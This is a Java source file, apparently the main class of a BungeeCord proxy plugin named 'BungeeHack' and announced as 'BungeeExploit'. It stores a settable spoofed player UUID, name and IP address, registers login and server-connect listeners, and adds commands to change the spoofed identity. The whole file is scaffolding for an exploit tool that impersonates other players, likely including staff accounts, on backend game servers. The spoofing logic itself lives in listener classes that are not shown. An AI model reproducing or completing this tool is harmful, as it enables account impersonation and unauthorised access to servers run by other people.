package jutting;

import java.util.UUID;
import jutting.commands.ConnectCommand;
import jutting.commands.IPCommand;
import jutting.commands.InfoCommand;
import jutting.commands.NameCommand;
import jutting.commands.UUIDCommand;
import jutting.listener.LoginListener;
import jutting.listener.PreLoginListener;
import jutting.listener.ServerConnectListener;
import net.md_5.bungee.api.ProxyServer;
import net.md_5.bungee.api.chat.TextComponent;
import net.md_5.bungee.api.plugin.Plugin;

public class BungeeHack extends Plugin {
   private static UUID uuid = UUID.randomUUID();
   private static String name = "Jutting";
   private static String ip = "127.0.0.1";

   public void onEnable() {
      ProxyServer.getInstance().getConsole().sendMessage(new TextComponent("§aBungeeExploit has been enabled!"));
      ProxyServer.getInstance().getConsole().sendMessage(new TextComponent("§aMade by Vessy1337."));
      ProxyServer.getInstance().getPluginManager().registerListener(this, new PreLoginListener());
      ProxyServer.getInstance().getPluginManager().registerListener(this, new LoginListener());
      ProxyServer.getInstance().getPluginManager().registerListener(this, new ServerConnectListener());
      ProxyServer.getInstance().getPluginManager().registerCommand(this, new ConnectCommand());
      ProxyServer.getInstance().getPluginManager().registerCommand(this, new UUIDCommand());
      ProxyServer.getInstance().getPluginManager().registerCommand(this, new NameCommand());
      ProxyServer.getInstance().getPluginManager().registerCommand(this, new IPCommand());
      ProxyServer.getInstance().getPluginManager().registerCommand(this, new InfoCommand());
   }

   public static String getPrefix() {
      return "§a";
   }

   public static UUID getUUID() {
      return uuid;
   }

   public static String getIP() {
      return ip;
   }

   public static String getName() {
      return name;
   }

   public static void setUUID(UUID uuid) {
      BungeeHack.uuid = uuid;
   }

   public static void setName(String name) {
      BungeeHack.name = name;
   }

   public static void setIP(String ip) {
      BungeeHack.ip = ip;
   }
}
